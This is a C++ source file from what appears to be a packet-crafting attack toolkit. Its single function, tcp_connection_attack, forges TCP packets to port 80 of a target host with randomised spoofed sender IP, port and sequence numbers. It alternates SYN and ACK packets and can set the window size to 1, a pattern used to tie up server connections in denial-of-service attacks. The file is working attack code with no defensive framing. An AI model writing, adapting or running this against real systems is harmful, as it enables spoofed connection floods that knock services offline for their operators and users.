#include "../lib/atkmod.h"

void ATTACKMODULE::tcp_connection_attack(PKT* packet, int ctrl)
{
    static int  isFirst = 1;

    static uint16_t  id = 0;
    static uint32_t  sender_ip = 0;
    static uint16_t  src_port = 0;
    static uint32_t  seq = 0;
    static uint32_t  ack = 0;
    static uint16_t  window = 0;

    // 처음이라면 랜덤 value
    if(isFirst)
    {
        fill_rand( (uint8_t*)&id,        sizeof(uint16_t) );
        fill_rand( (uint8_t*)&sender_ip, sizeof(uint32_t) );
        fill_rand( (uint8_t*)&src_port,  sizeof(uint16_t) );
        fill_rand( (uint8_t*)&seq,       sizeof(uint32_t) );
        
        if(ctrl)
            window = 1;
        else
            fill_rand( (uint8_t*)&window,    sizeof(uint16_t) );

        packet->make_specific_packet(
            target_mac,  /* target MAC */
            id,          /* id */
            sender_ip,   /* sender IP */
            target_ip,   /* target IP */
            src_port,    /* src port */
            80,          /* dst port */
            seq,         /* sequence number */
            ack,         /* acknowldge number */
            window,      /* window size */
            TCP,         /* packet type */
            SYN,         /* flag type */
            0            /* data length */
        );

        isFirst = 0;
    }

    else
    {
        id++;
        seq++;
        ack++;

        packet->make_specific_packet(
            target_mac,  /* target MAC */
            id,          /* id */
            sender_ip,   /* sender IP */
            target_ip,   /* target IP */
            src_port,    /* src port */
            80,          /* dst port */
            seq,         /* sequence number */
            ack,         /* acknowldge number */
            window,      /* window size */
            TCP,         /* packet type */
            ACK,         /* flag type */
            0            /* data length */
        );

        isFirst = 1;
    }
    
}